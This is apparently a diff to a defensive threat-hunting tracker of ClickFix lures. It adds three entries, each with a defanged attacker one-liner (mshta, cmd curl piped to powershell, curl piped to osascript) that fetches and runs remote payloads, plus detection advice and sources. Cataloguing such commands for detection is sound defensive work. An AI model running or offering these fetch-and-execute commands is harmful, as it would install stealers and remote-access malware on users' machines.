@@ -7,8 +7,8 @@ ClickFix is a social-engineering technique where a victim is tricked (fake CAPTC
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 21
-- **Last updated:** 2026-08-25
+- **Entries:** 24
+- **Last updated:** 2026-08-27
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -36,6 +36,9 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0019 | `zsh` | macOS 'Google Meet audio fix' ClickFix lure; a base64-encoded URL is decoded inline and the fetched script is piped straight into zsh | Malwarebytes Threat Intelligence |
 | cf-0020 | `powershell.exe` | ClickFix one-liner retrieves JSON from a /Fix endpoint and executes the nested '.note.body' property to launch a multi-stage PowerShell-to-RAT chain | Fortinet FortiGuard Labs |
 | cf-0021 | `rundll32.exe` | ClickFix loads a DLL from an @SSL WebDAV share, disguised with a '.google' extension and invoked by ordinal '#1' (ACR Stealer WebDAV chain) | Microsoft Defender Experts / Red Canary (via The Hacker News) |
+| cf-0022 | `mshta.exe` | Fake-CAPTCHA ClickFix pastes an mshta one-liner that pulls remote HTA/script content from a hex-octal-obfuscated IP literal (0x5a) with a non-.hta extension (.gz/.odd/.dat); leads to .NET loader that extracts shellcode hidden via steganography in a PNG. | Huntress |
+| cf-0023 | `cmd.exe` | Fake-CAPTCHA ClickFix pastes a cmd one-liner that curls an attacker host whose URL path impersonates a trusted CDN (amazoncdn / cdn-dynmedia-1.microsoft.com) and pipes the response straight into powershell (no file drop, no iex); observed dropping Latrodectus and Supper. | CERT Polska |
+| cf-0024 | `osascript` | macOS ClickFix 'fake utility' lure offers a one-click copy of an obfuscated curl one-liner that pipes a remotely fetched AppleScript directly into osascript (sibling variants pipe to zsh with base64+gzip+eval), bypassing Gatekeeper by never writing an app bundle; delivers infostealers with a t.me Telegram C2 fallback. | Microsoft Threat Intelligence |
 
 ### cf-0001 — `powershell.exe`
 
@@ -267,6 +270,39 @@ powershell IEX ((Invoke-RestMethod -Uri hxxps://pharmacynod[.]com/Fix -Method GE
 - **Detection:** rundll32.exe loading a UNC path containing '@ssl' with a non-.dll file extension and an ordinal export (e.g. ',#1')
 - **Source:** Microsoft Defender Experts / Red Canary (via The Hacker News) — hxxps://www.microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
 - **Added:** 2026-07-16
+
+### cf-0022 — `mshta.exe`
+
+```text
+mshta hxxp://81[.]0x5a[.]29[.]64/ebc/rps.gz
+```
+
+- **Technique:** Fake-CAPTCHA ClickFix pastes an mshta one-liner that pulls remote HTA/script content from a hex-octal-obfuscated IP literal (0x5a) with a non-.hta extension (.gz/.odd/.dat); leads to .NET loader that extracts shellcode hidden via steganography in a PNG.
+- **Detection:** Alert on mshta.exe whose command line contains a bare IPv4/hex-octal host (e.g. '0x' in the hostname) and remote paths ending in .gz/.dat/.odd instead of .hta; mshta rarely fetches remote content on endpoints.
+- **Source:** Huntress — hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images
+- **Added:** 2026-07-01
+
+### cf-0023 — `cmd.exe`
+
+```text
+cmd /c curl naintn[.]com/amazoncdn[.]com/oeiich37874cj30dkk43885j10vj38h38jd/nrs/opn/ca/ | powershell
+```
+
+- **Technique:** Fake-CAPTCHA ClickFix pastes a cmd one-liner that curls an attacker host whose URL path impersonates a trusted CDN (amazoncdn / cdn-dynmedia-1.microsoft.com) and pipes the response straight into powershell (no file drop, no iex); observed dropping Latrodectus and Supper.
+- **Detection:** Hunt for cmd.exe spawning curl.exe piped to powershell.exe where the URL host is a short unrelated domain but the path embeds 'amazoncdn'/'microsoft'/'cdn'; correlate with HKCU RunMRU entries.
+- **Source:** CERT Polska — hxxps://cert[.]pl/en/posts/2026/02/fake-captcha-in-action/
+- **Added:** 2026-02-01
+
+### cf-0024 — `osascript`
+
+```text
+curl -s hxxps://honestly[.]ink/<id> | osascript
+```
+
+- **Technique:** macOS ClickFix 'fake utility' lure offers a one-click copy of an obfuscated curl one-liner that pipes a remotely fetched AppleScript directly into osascript (sibling variants pipe to zsh with base64+gzip+eval), bypassing Gatekeeper by never writing an app bundle; delivers infostealers with a t.me Telegram C2 fallback.
+- **Detection:** On macOS, alert when Terminal/osascript or zsh is the child of a curl|pipe execution fetching a remote script; inspect shell history and Unified Log for 'curl … | osascript' and lookups to honestly[.]ink / 0x666[.]info.
+- **Source:** Microsoft Threat Intelligence — hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
+- **Added:** 2026-05-06
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
